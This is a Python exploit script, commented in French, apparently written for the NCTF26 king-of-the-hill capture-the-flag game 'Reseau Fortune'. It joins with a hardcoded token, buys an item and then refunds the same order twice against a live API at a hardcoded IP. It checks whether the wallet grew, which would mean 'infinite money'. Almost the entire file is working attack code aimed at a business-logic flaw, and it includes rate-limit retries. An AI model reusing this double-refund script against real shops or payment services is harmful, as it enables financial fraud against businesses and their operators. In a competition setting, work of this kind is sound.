#!/usr/bin/env python3
"""
NCTF26 KOTH — Reseau Fortune : test du DOUBLE REMBOURSEMENT.

On achète une fois, puis on rembourse DEUX fois la même commande.
Si le 2e remboursement passe et que wallet/net_gain montent -> argent infini
(on scalera ensuite avec le minimum de requêtes). Retry lent, compte à nous.
"""
import json, time, urllib.request, urllib.error
from http.cookiejar import CookieJar

HOST  = "http://13.37.197.230:28493"
TOKEN = "6eefff4072981996"
DELAY, MAX = 8, 10

cj = CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def call(path, body=None, label=""):
    data = json.dumps(body).encode() if body is not None else None
    for attempt in range(1, MAX + 1):
        req = urllib.request.Request(HOST + path, data=data,
                                     headers={"Content-Type": "application/json"},
                                     method="POST" if body is not None else "GET")
        try:
            with opener.open(req, timeout=8) as r:
                txt = r.read().decode(errors="replace")
                print(f"  {label or path} -> {r.status} {txt[:300]}")
                try: return json.loads(txt)
                except Exception: return {}
        except urllib.error.HTTPError as e:
            b = e.read().decode(errors="replace")
            if e.code == 429:
                print(f"  {label or path} -> 429, retente {DELAY}s [{attempt}/{MAX}]"); time.sleep(DELAY); continue
            print(f"  {label or path} -> {e.code} {b[:300]}"); return {}
        except Exception as ex:
            print(f"  {label or path} -> erreur {ex}, retente {DELAY}s"); time.sleep(DELAY); continue
    print(f"  {label or path} -> abandon ({MAX} essais)"); return {}

print("1) join");  call("/api/join", {"token": TOKEN}, "join")
print("2) achat booster"); buy = call("/api/buy", {"product": "booster", "qty": 1}, "buy")
oid = buy.get("order_id")
if oid is None:
    print("pas d'order_id -> colle la sortie, on ajuste.")
else:
    print(f"3) 1er remboursement (order {oid})"); call("/api/refund", {"order_id": oid}, "refund#1")
    print(f"4) 2e remboursement (order {oid})");  call("/api/refund", {"order_id": oid}, "refund#2")
    print("5) état final"); me = call("/api/me", label="me(final)")
    print()
    w, ng = me.get("wallet"), me.get("net_gain")
    print(f"-> wallet={w}, net_gain={ng}")
    if (w or 0) > 50000 or (ng or 0) > 0:
        print("   DOUBLE REFUND MARCHE : argent créé. On scalera au minimum de requêtes.")
    else:
        print("   2e refund bloqué -> colle la sortie, on passe à transfer / activation.")
